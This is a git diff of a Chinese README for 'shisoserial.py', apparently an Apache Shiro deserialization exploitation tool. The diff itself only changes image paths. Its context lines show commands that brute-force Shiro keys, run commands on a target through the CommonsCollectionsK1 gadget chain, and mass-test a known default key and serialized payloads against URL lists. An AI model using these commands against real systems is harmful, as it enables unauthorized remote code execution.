@@ -66,15 +66,15 @@ optional arguments:
 python3 shisoserial.py -m check -u http://127.0.0.1:8080
 ```
 
-![](README.assets/image-20211229165754332.png)
+![](README.assets/1.png)
 
 ### 使用代理和CBC加密爆破目标shiro key
 
 ```
-python3 shisoserial.py -m crack -u http://*.*.*.*:**** -t CBC -p http://*.*.*.*:****/
+python3 shisoserial.py -m crack -u http://*.*.*.*:**** -t CBC -p ****://*.*.*.*:****/
 ```
 
-![](README.assets/image-20211229171904315.png)
+![](README.assets/2.jpg)
 
 ### 使用CommonsCollectionsK1利用链执行命令并获取命令执行结果
 
@@ -82,7 +82,7 @@ python3 shisoserial.py -m crack -u http://*.*.*.*:**** -t CBC -p http://*.*.*.*:
 python3 shisoserial.py -m echo -u http://127.0.0.1:8080 -g CommonsCollectionsK1 -c id
 ```
 
-![](README.assets/image-20211229175021680.png)
+![](README.assets/3.png)
 
 ### 使用Post请求批量验证指定的shiro key
 
@@ -90,7 +90,7 @@ python3 shisoserial.py -m echo -u http://127.0.0.1:8080 -g CommonsCollectionsK1 
 python3 shisoserial.py -m crack -u target_urls.txt -k kPH+bIxk5D2deZiIxcaaaA== -d username=1
 ```
 
-![image-20211229223405240](README.assets/image-20211229223405240.png)
+![image-20211229223405240](README.assets/4.jpg)
 
 ### 使用序列化数据文件构造payload并使用多线程批量发送
 
@@ -98,7 +98,7 @@ python3 shisoserial.py -m crack -u target_urls.txt -k kPH+bIxk5D2deZiIxcaaaA== -
 python3 shisoserial.py -m encode -u target_urls.txt -t cbc -s 1.ser -T 4
 ```
 
-![image-20211230181021173](README.assets/image-20211230181021173.png)
+![image-20211230181021173](README.assets/5.jpg)
 
 ## 免责声明
 
